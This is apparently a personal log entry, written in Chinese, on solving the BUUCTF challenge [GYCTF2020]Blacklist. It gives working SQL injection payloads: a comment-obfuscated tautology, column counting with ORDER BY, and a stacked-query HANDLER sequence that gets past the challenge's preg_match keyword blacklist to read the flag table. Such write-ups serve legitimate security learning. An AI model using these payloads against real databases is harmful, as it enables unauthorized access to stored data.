编号      日期                 题目               平台         介绍
 1     2026/4/27      [GYCTF2020]Blacklist      BUUCTF        这道题可以1' /*!or*/ /*!1=1*/ # 成功注入，之后使用order by得知结果为2列，准备使用union联合注入，但是
                                                              preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject)过滤了大多数函数，但是可以show tables之类的
                                                              得到很多信息（表名，列名），之后想到handler未被过滤，使用handler成功读取到flag：（以下是注入的答案）
                                                              1';handler FlagHere open;handler FlagHere read first;handler FlagHere read next;handler FlagHere close;#
